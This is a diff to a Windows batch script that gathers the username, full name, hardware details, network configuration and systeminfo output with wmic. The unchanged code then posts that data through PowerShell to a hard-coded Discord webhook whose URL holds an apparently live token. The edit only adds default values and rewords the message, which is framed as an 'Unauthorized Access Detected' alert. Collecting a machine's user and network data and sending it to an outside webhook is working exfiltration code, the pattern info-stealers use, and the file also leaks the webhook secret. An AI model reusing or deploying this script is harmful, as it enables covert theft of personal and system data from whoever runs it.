@@ -64,8 +64,16 @@ for /f "tokens=*" %%a in ('wmic memorychip get capacity') do set "raminfo=%%a"
 :: Get user full name
 for /f "tokens=*" %%a in ('wmic useraccount where name="%user_name%" get fullname') do set "userfullname=%%a"
 
+:: Fix any empty fields by setting default values if needed
+if "%sysinfo%"=="" set "sysinfo=No system info found."
+if "%networkinfo%"=="" set "networkinfo=No network info found."
+if "%systemmodel%"=="" set "systemmodel=No system model found."
+if "%cpuinfo%"=="" set "cpuinfo=No CPU info found."
+if "%raminfo%"=="" set "raminfo=No RAM info found."
+if "%userfullname%"=="" set "userfullname=No full name found."
+
 :: Format the message with better structure and additional info
-set "message={\"content\":\"**Alert: Unauthorized Access Detected!**\\nHere is the detailed system information:\\n\\n**User:** %user_name%\\n**Full Name:** %userfullname%\\n**System Model:** %systemmodel%\\n**CPU:** %cpuinfo%\\n**RAM Capacity:** %raminfo%\\n**Network Configuration:** %networkinfo%\\n**System Information:** %sysinfo%\"}"
+set "message={\"content\":\"**Alert: Unauthorized Access Detected!**\\n\\nHere is the detailed system information:\\n\\n**User:** %user_name%\\n**Full Name:** %userfullname%\\n**System Model:** %systemmodel%\\n**CPU:** %cpuinfo%\\n**RAM Capacity:** %raminfo%\\n**Network Configuration:** %networkinfo%\\n**System Information:** %sysinfo%\\n\\nPlease take appropriate actions immediately.\"}"
 
 :: Send information to Discord webhook with better formatting and content type
 powershell -Command "Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1337159633239937115/KdOhG-AXg3ckXDIrmcWESldNObYb5dZ16S8F591bs12XlwFC7M_l754ukBqeyhvXcJwY' -Method Post -Body '%message%' -ContentType 'application/json'"
